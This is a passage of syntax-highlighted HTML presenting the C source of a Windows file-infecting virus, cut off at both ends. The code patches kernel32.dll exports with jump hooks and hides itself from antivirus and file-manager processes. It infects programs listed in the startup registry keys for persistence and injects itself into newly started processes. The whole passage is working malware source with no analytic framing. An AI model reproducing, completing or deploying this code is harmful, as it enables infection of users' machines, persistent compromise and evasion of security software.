                    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">=</span><span class="sc11">STEALTH_AV</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0x68df08d3</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0x302f9eef</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0xcdeea7f8</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0xb27b3251</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">crc</span><span class="sc10">==</span><span class="sc4">0x9e8f4fc0</span><span class="sc10">)</span><span class="sc0">                
                  </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">=</span><span class="sc11">STEALTH_SIZE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//acdsee,explorer,cmd,winrar,wincmd
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc1">/*
       now patch kernel32.dll's exports asuming that it is a valid module :)

       each api export is hooked by placing a jmp on its original code. this
       code is backed up at base+virtualsize-100+n*0x10 where n is the api #

    */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">   
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hookapi</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">k32base</span><span class="sc10">,((</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">crcs</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">))[</span><span class="sc11">i</span><span class="sc10">],(</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">hookentry</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">4</span><span class="sc10">),(</span><span class="sc16">char</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc11">VIRTUALSIZE</span><span class="sc10">-</span><span class="sc4">0x100</span><span class="sc10">)+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">0x10</span><span class="sc10">)))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">*)</span><span class="sc11">a</span><span class="sc10">)[</span><span class="sc11">i</span><span class="sc10">]=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+(</span><span class="sc11">VIRTUALSIZE</span><span class="sc10">-</span><span class="sc4">0x100</span><span class="sc10">)+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">0x10</span><span class="sc10">;</span><span class="sc2">//each hook has 0x10 backup space.
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc11">hg</span><span class="sc10">-&gt;</span><span class="sc11">rnd32seed</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">GetTickCount</span><span class="sc10">()^</span><span class="sc11">l</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//init rnd32
</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc11">getrnd32</span><span class="sc10">(</span><span class="sc11">hg</span><span class="sc10">)%</span><span class="sc4">16384</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//a delta delay
</span><span class="sc0">
    </span><span class="sc11">doregistery</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">doregistery</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0"> 

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">procsum</span><span class="sc10">=</span><span class="sc11">getprocsum</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(;;)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">*</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">procsum</span><span class="sc10">!=</span><span class="sc11">getprocsum</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">procsum</span><span class="sc10">=</span><span class="sc11">getprocsum</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">))==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//test not needed
</span><span class="sc0">            </span><span class="sc11">makeresident</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">__seh_rem</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc2">// used to notice new processes.
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getprocsum</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ppid</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">EnumProcesses</span><span class="sc10">(</span><span class="sc11">ppid</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">,&amp;</span><span class="sc11">n</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc11">n</span><span class="sc10">&gt;&gt;</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">sum</span><span class="sc10">+=</span><span class="sc11">ppid</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sum</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc2">// infects files started by registery to ensure a safe place in the system
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">doregistery</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">reghandle</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">RegOpenKeyExA</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">startupregkey</span><span class="sc10">-</span><span class="sc4">0x401000</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc10">*)</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">reghandle</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(;;</span><span class="sc11">index</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">valuedata</span><span class="sc10">[</span><span class="sc4">520</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">valuename</span><span class="sc10">[</span><span class="sc4">260</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">short</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">vdata</span><span class="sc10">=(</span><span class="sc16">short</span><span class="sc10">*)</span><span class="sc11">valuedata</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dsize</span><span class="sc10">=</span><span class="sc4">260</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nsize</span><span class="sc10">=</span><span class="sc4">130</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">RegEnumValueW</span><span class="sc10">(</span><span class="sc11">reghandle</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc11">index</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc11">valuename</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc10">&amp;</span><span class="sc11">nsize</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc10">&amp;</span><span class="sc19">type</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vdata</span><span class="sc10">,</span><span class="sc0">
                                 </span><span class="sc10">&amp;</span><span class="sc11">dsize</span><span class="sc10">)!=</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//asdf
</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vdata</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'"'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">vdata</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">dsize</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vdata</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'"'</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">vdata</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isgoodname</span><span class="sc10">(</span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">a</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vdata</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">isinfected</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vdata</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">vdata</span><span class="sc10">,</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">reghandle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/* hooks from module 'base' the exported api-name whose crc matches 'crc' and
   makes it point to 'fn' and backups at 'backup' */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">hookapi</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">crc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">fn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">backup</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">PE_EXPORT</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">exp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_EXPORT</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+((</span><span class="sc11">PE_HEADER</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+((</span><span class="sc11">MZ_HEADER</span><span class="sc10">*)</span><span class="sc11">base</span><span class="sc10">)-&gt;</span><span class="sc11">mz_neptr</span><span class="sc10">))-&gt;</span><span class="sc11">pe_exportrva</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc10">**</span><span class="sc0"> </span><span class="sc11">nametbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">**)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_namepointersrva</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">short</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ordinaltbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">short</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_ordinaltablerva</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">fntbl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">+</span><span class="sc11">exp</span><span class="sc10">-&gt;</span><span class="sc11">ex_addresstablerva</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc11">nametbl</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">)!=</span><span class="sc11">crc</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">apicode</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc10">*)(</span><span class="sc11">fntbl</span><span class="sc10">[</span><span class="sc11">ordinaltbl</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]]+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//disassemble first part of api
</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(;;)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">=</span><span class="sc11">poordasm</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">apicode</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">l</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">||</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">//if we were able to disasm &gt;=5 bytes then hook it
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">backup</span><span class="sc10">,</span><span class="sc11">apicode</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//backup original code aligned on opcodes
</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">backup</span><span class="sc10">+=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">backup</span><span class="sc10">=</span><span class="sc4">0xe9</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">backup</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">apicode</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">-(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">backup</span><span class="sc10">-</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">newrva</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fn</span><span class="sc10">-(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">apicode</span><span class="sc10">-</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">oldprot</span><span class="sc10">=</span><span class="sc11">changeprot</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">apicode</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//deprotect
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">oldprot</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//if windows decides to taskswitch between these two lines,
</span><span class="sc0">            </span><span class="sc2">//we are really really screwed...
</span><span class="sc0">            </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">apicode</span><span class="sc10">=</span><span class="sc4">0xe9</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">*(</span><span class="sc16">int</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">apicode</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)=</span><span class="sc11">newrva</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">changeprot</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">apicode</span><span class="sc10">,</span><span class="sc11">oldprot</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc2">//reprotect
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">changeprot</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">MEMORY_BASIC_INFORMATION</span><span class="sc0"> </span><span class="sc11">mbf</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualQuery</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">address</span><span class="sc10">&amp;~</span><span class="sc4">0xfff</span><span class="sc10">),&amp;</span><span class="sc11">mbf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mbf</span><span class="sc10">))==</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mbf</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mbf</span><span class="sc10">.</span><span class="sc11">Protect</span><span class="sc10">==</span><span class="sc11">flags</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">oldprot</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">=</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">VirtualProtect</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc10">*)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">address</span><span class="sc10">&amp;~</span><span class="sc4">0xfff</span><span class="sc10">),</span><span class="sc4">4096</span><span class="sc10">,</span><span class="sc11">flags</span><span class="sc10">,&amp;</span><span class="sc11">oldprot</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">oldprot</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
         </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">//return 0
</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">//locals used by make resident (imho to large to alloc on stack)
</span><span class="sc9">#define MAX_PROC 256
#define MAX_HMOD 512
#define MAX_BUFF 0x2000
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">MAKERESIDENT_</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ppid</span><span class="sc10">[</span><span class="sc11">MAX_PROC</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hmod</span><span class="sc10">[</span><span class="sc11">MAX_HMOD</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">MAX_BUFF</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">MAKERESIDENT</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* enums processes, check if they are already hooked, if not, do it */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">makeresident</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">vimbase</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">MAKERESIDENT</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mr</span><span class="sc10">=(</span><span class="sc11">MAKERESIDENT</span><span class="sc10">*)</span><span class="sc11">alloc</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MAKERESIDENT</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cproc</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">-&gt;</span><span class="sc11">EnumProcesses</span><span class="sc10">(</span><span class="sc11">mr</span><span class="sc10">-&gt;</span><span class="sc11">ppid</span><span class="sc10">,</span><span class="sc11">MAX_PROC</span><span class="sc10">,&amp;</span><span class="sc11">cproc</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
